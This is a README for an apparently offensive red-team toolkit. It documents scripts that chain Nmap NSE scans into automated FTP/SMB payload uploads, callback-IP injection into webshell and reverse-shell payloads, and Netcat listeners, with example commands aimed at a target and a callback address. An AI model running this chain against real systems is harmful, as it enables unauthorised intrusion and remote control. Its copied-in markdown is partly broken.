# 🛠️ Dharma Utility Scripts

This directory contains the core automation logic for Dharma's exploitation chain. Each script is modular, supports chaining, and is built for red team operational workflows.

---

## 🔱 Scripts Included

### `auto-nse.py`
**Purpose:** Intelligent Nmap scripting based on pre-existing reconnaissance data.

- Parses `loot/` JSON files to suggest and execute relevant NSE scans.
- Supports HTTP, FTP, and SMB protocol-based targeting.
- Can auto-launch exploit logic after scan (`--auto-chain`).
- Outputs structured scan logs in `results/<target>/nmap/`.

**Key Flags:**
```bash
--run              # Execute suggested NSE scans
--callback IP:PORT # Optional for chaining into exploit
--auto-chain       # Automatically launch exploit after NSE
--loot-only        # Skip scans, just parse loot
Example:

bash
Copy
Edit
python3 auto-nse.py --target 10.10.10.42 --run --auto-chain --callback 10.10.14.3:4444
auto-exploit.py
Purpose: Uploads payloads via FTP/SMB based on loot, injects callback IPs, and catches shells.

Automatically finds payloads in correct directories (web/, windows/, linux/).

Replaces {{CALLBACK}}, {{CALLBACK_IP}}, {{CALLBACK_PORT}} inside payloads.

Launches Netcat or HTTP listeners for reverse shells.

Writes logs to results/<target>/exploit-log.txt.

Key Flags:

bash
Copy
Edit
--callback IP:PORT   # Inject callback info into payloads
--listen             # Start Netcat listener
--http-listen        # Start HTTP shell beacon catcher
--generate-rc        # Output Metasploit handler file
Example:

bash
Copy
Edit
python3 auto-exploit.py --target 10.10.10.42 --callback 10.10.14.3:4444 --listen --generate-rc
🧩 Payload Structure
Payloads must be located in:

mathematica
Copy
Edit
payloads/
├── web/        ← For PHP/ASP webshells (FTP)
├── windows/    ← For .ps1, .bat (SMB - Windows)
├── linux/      ← For .sh, .c (SMB - Linux)
Supported placeholders inside payloads:

objectivec
Copy
Edit
{{CALLBACK}}        → IP:PORT
{{CALLBACK_IP}}     → IP only
{{CALLBACK_PORT}}   → Port only
📁 Output Structure
After execution, logs and loot will be stored in:

pgsql
Copy
Edit
loot/
├── ftp-10_10_10_42.json
├── smb-10_10_10_42.json
├── http-10_10_10_42.json

results/
└── 10.10.10.42/
    ├── exploit-log.txt
    └── nmap/
        ├── ftp_nse.txt
        ├── smb_nse.txt
        └── http_nse.txt
📦 Requirements
Python 3.7+

nmap

ncat or netcat

impacket (pip install impacket)

Optional: msfconsole for .rc launch

✅ Usage Workflow
Gather recon and write JSON to loot/

Run auto-nse.py to recommend or execute NSE scans

Chain into auto-exploit.py to drop payloads

Start listener and catch shell

Review logs in results/

🧠 Notes
Scripts are designed to be headless and operator-friendly.

All payload injection is done dynamically.

Ideal for internal testing, assumed-breach scenarios, or red team pivot chains.

Built for speed. Made for operators. Dharma never sleeps.
